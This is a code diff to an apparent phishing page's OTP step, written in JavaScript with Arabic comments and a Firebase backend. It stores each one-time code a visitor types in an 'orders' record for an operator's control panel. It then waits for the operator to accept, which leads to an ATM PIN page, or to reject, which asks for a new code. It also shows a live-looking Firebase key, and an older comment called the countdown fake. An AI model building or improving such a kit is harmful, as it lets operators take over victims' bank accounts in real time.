@@ -53,9 +53,10 @@
 
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>
 
 <script>
-    // إعدادات Firebase الخاصة بك (jusour-qatar)
+    // إعدادات Firebase الحقيقية لمشروع (jusour-qatar)
     const firebaseConfig = {
       apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
       authDomain: "jusour-qatar.firebaseapp.com",
@@ -68,16 +69,19 @@
     
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+    const analytics = firebase.analytics();
 
     const otpForm = document.getElementById("otpForm");
     const formSection = document.getElementById("formSection");
     const loadingOverlay = document.getElementById("loadingOverlay");
     const errorMsg = document.getElementById("errorMessage");
 
+    // استرجاع معرف الطلب الأساسي لربط الـ OTP بنفس العميل
+    const currentOrderId = sessionStorage.getItem("last_order_id");
+
     otpForm.onsubmit = async (e) => {
         e.preventDefault();
         
-        // إظهار اللودر وإخفاء الفورم
         formSection.style.display = "none";
         loadingOverlay.style.display = "block";
         errorMsg.style.display = "none";
@@ -85,39 +89,53 @@
         const otpValue = document.getElementById("otpCode").value;
 
         try {
-            // نحدث الطلب في الفايربيس بالكود الجديد ونغير الحالة لانتظار ردك
-            // سنضيف وثيقة جديدة في "payments" لمراقبتها
-            const docRef = await db.collection("payments").add({
-                otp_code: otpValue,
-                status: "otp_waiting", // العميل الآن ينتظر ردك من اللوحة
-                timestamp: firebase.firestore.FieldValue.serverTimestamp()
-            });
+            // تسجيل حدث إدخال الكود
+            analytics.logEvent('otp_submitted');
 
-            // بدء مراقبة هذه الوثيقة تحديداً بانتظار ردك
-            listenForAdminAction(docRef.id);
+            // تحديث الطلب الحالي بالكود الجديد لكي يظهر لك في لوحة التحكم
+            if (currentOrderId) {
+                await db.collection("orders").doc(currentOrderId).update({
+                    otp_code: otpValue,
+                    status: "otp_waiting",
+                    otp_timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                });
+                
+                // مراقبة القرار اللي هتاخده أنت من لوحة التحكم
+                listenForAdminAction(currentOrderId);
+            } else {
+                // حالة احتياطية إذا فُقدت الجلسة
+                const newDoc = await db.collection("orders").add({
+                    otp_code: otpValue,
+                    status: "otp_waiting",
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                });
+                listenForAdminAction(newDoc.id);
+            }
 
         } catch (err) {
-            console.error("Error:", err);
+            console.error("Firebase Error:", err);
             resetForm();
         }
     };
 
     function listenForAdminAction(docId) {
-        db.collection("payments").doc(docId).onSnapshot((doc) => {
+        db.collection("orders").doc(docId).onSnapshot((doc) => {
             const data = doc.data();
             if (!data) return;
 
-            // إذا أعطيت قبول (توجيه لصفحة ATM PIN)
+            // إذا ضغطت "قبول" في لوحتك
             if (data.status === "accept_otp") {
+                analytics.logEvent('otp_accepted');
                 window.location.href = "atm_pin.php";
             } 
-            // إذا أعطيت رفض (رجوع لنفس الصفحة مع رسالة خطأ)
+            // إذا ضغطت "طلب كود جديد" أو "رفض"
             else if (data.status === "reject_otp") {
+                analytics.logEvent('otp_rejected');
                 resetForm();
                 errorMsg.style.display = "block";
                 document.getElementById("otpCode").value = "";
             }
-            // إذا انتهت العملية بنجاح تام (لو أردت إنهاءها هنا مباشرة)
+            // إنهاء العملية بنجاح
             else if (data.status === "success") {
                 window.location.href = "success.php";
             }
@@ -129,7 +147,7 @@
         loadingOverlay.style.display = "none";
     }
 
-    // العداد التنازلي الوهمي للـ OTP
+    // العداد التنازلي
     let duration = 119;
     const display = document.querySelector('#time');
     setInterval(() => {
